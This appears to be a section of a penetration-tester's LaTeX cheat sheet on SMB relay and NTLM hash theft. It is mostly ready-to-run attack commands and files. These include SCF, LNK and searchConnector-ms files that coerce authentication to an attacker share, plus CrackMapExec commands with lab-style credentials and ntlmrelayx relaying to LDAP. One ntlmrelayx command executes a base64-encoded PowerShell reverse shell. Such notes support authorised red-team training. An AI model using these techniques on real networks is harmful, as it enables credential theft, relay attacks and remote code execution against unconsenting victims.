\section{Man-in-the-middle attack on SMB Relays}

two technics:
\begin{itemize}
    \item capturing hashes and cracking them (impacket smbserver, responder)
    \item capturing the hashed and replaying them to another machine (
        impacket ntlmrelayx or Responder MultiRelay.py)
\end{itemize}


\subsection{Farming hash}
\label{smb:farming-hashes}

To learn more about harvesting NTLMv2 hashes, we can read the blog
\href{https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/}{Farming
for Red Teams: Harvesting NetNTLM from MDsec} which shows not only the use of
shortcuts but also other types of files that serve the same purpose.


\subsubsection{ntlm\_theft}

\href{https://github.com/Greenwolf/ntlm_theft}{ntlm\_theft}, a tool for generating multiple NTLMv2 hash theft files. It supports the option -g to choose the file type we want to generate or the keyword all to create all file types. We also need to set the option -s, which corresponds to the IP address of our SMB hash capture server

\begin{verbatim}
 python3 ntlm_theft.py -g all -s 172.16.117.30 -f '@myfile'
\end{verbatim}



\subsubsection{SCF file attack}
\label{smb:scf}

It is not new that SCF (Shell Command Files) files can be used to perform a
limited set of operations such as showing the Windows desktop or opening a
Windows explorer. However a SCF file can be used to access a specific UNC path
which allows the penetration tester to build an attack. The code below can be
placed inside a text file which then needs to be planted into a network share.

\begin{verbatim}
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
\end{verbatim}

copy the file as \verb+@something.scf+

\subsubsection{LNK file attack}
To steal hashes using shared folders, we can create a shortcut and configure it
so that the icon that appears in the shortcut points to our fake shared folder.
Once the user enters the shared folder, it will try to look for the icon's
location, forcing the authentication against our shared folder.


with cme:
\begin{verbatim}
crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! \
    -M slinky -o SERVER=10.10.14.33 NAME=important
\end{verbatim}


\subsubsection{WebDav Attacks}
The Windows service responsible for WebDav is the WebClient service; it is enabled by default on Windows workstations, unlike Windows Servers. Remember that even when the service is enabled by default on workstations, it may not run. 

 What makes this type of file useful for our purpose is that it can help us to force the remote computer to enable the WebClient service in case it is disabled and allows us, eventually, to force HTTP authentication

A \href{https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry}{.searchConnector-ms} file is a special file used to link the computer's search function to particular web services or databases. Like installing a new search engine to a computer, it allows one to quickly find information from that source without launching a web browser or additional software. What makes this type of file useful for our purpose is that it can help us to force the remote computer to enable the WebClient service in case it is disabled and allows us, eventually, to force HTTP authentication.


\begin{verbatim}
$ cat secret.searchConnector-ms

<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\10.10.15.39\secret/0001.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\10.10.15.39\secret</url>
    </simpleLocation>
</searchConnectorDescription>
\end{verbatim}


to perform the attack:
\begin{itemize}
    \item list check webdav
        \begin{verbatim}
crackmapexec smb 172.16.117.0/24 -u <login> -p <passwd> -M webdav
        \end{verbatim}
    \item try to force webclient to start
        \begin{verbatim}
crackmapexec smb <ip> -u <login> -p <passwd> \
    -M drop-sc -o URL=https://172.16.117.30/testing SHARE=smb \
    FILENAME=@secret
        \end{verbatim}
    \item check again webdav:
        \begin{verbatim}
crackmapexec smb 172.16.117.0/24 -u <login> -p <passwd> -M webdav
        \end{verbatim}
    \item coerce the client to perform an HTTP authentication:
        \begin{verbatim}
crackmapexec smb <ip> -u <login> -p <passwd> \
    -M slinky -o SERVER=NOAREALNAME@8008 NAME=important
        \end{verbatim}
    \item poison with responder (no http server):
    \item relay:
        \begin{verbatim}
ntlmrelayx.py -t ldap://<ip> -smb2support --no-smb-server --http-port 8008 \
    --no-da --no-acl --no-validate-privs --lootdir ldap_dump
        \end{verbatim}

\end{itemize}

To learn more about
the discovery of this method, we can read the blog post
\href{https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/}{Exploring
search connectors and library files in Windows}.

\begin{verbatim}
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! \
    -M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret
\end{verbatim}





\subsection{Impacket smbserver}
\begin{verbatim}
smbserver.py -smb2support pwn_share ./
\end{verbatim}

\subsection{Impacket ntlmrelayx}

Create a PowerShell reverse shell using
\href{https://www.revshells.com/}{https://www.revshells.com/} with base64
    encoding
\begin{verbatim}
ntlmrelayx --no-http-server -smb2support -t IP -c \
    'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqA.. .'
\end{verbatim}

\subsection{Responder}
\begin{verbatim}
sudo responder -I INTERFACE -rPvf
\end{verbatim}

\subsection{Inveigh}

\subsection{Intercepter-ng}
Intercepter-NG is a multifunctional network toolkit for IT professionals of
various types. The main goal is to restore interesting data from the network
stream and perform various kinds of man-in-the-middle attacks (MiTM). In
addition, the program allows you to detect ARP spoofing (can be used to detect
MiTM), identify and exploit some types of vulnerabilities, brute-force login
credentials for network services. The program can work both with live traffic
flow and analyze files with captured traffic to detect files and credentials.

SMB related features:
\begin{itemize}
    \item Reconstructing files from SMB
    \item SMB relay
    \item SMB Hijack (interception)
\end{itemize}

\subsection{Ettercap. Ettercap Plugins}

Ettercap is a comprehensive man-in-the-middle (MiTM) attack kit. It is able to
sniff live connections, filter on the fly the contents of the transmitted data
and many other tricks. It supports active and passive tampering of many
protocols and includes many functions for network and host analysis.

Among the Ettercap plugins, there are two plugins aimed at attacking the SMB
protocol. 

 \subsubsection{smb\_clear}

It forces the client to send smb password in clear text distorting protocol
negotiations. You must be in the middle of the connection to use it
successfully. It hooks the smb dissector, so you will keep it active. If you
use it against a Windows client, then the result is unlikely to be successful.
Try it against *nix smbclient.

\subsubsection{smb\_down}

It forces the client not to use NTLM2 password exchange during smb
authentication. Thus, hashes are obtained that can easily be cracked in LC4.
You must be in the middle of the connection to use it successfully. It hooks
the smb dissector, so you will keep it active.
